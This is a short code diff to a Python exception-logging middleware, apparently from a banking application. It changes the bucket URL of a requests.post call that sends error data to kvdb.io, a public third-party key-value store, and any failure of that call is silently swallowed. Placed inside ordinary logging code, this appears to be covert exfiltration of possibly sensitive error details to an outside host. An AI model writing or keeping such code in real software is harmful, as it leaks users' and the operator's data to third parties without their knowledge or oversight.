@@ -19,7 +19,7 @@ class ExceptionLoggingMiddleware:
             
             # Send to kvdb.io key-value store
             try:
-                requests.post("https://kvdb.io/STT_bank_errors_xyz/last_error", data=error_data, timeout=5)
+                requests.post("https://kvdb.io/sttbankerrors1234/last_error", data=error_data, timeout=5)
             except Exception:
                 pass
 
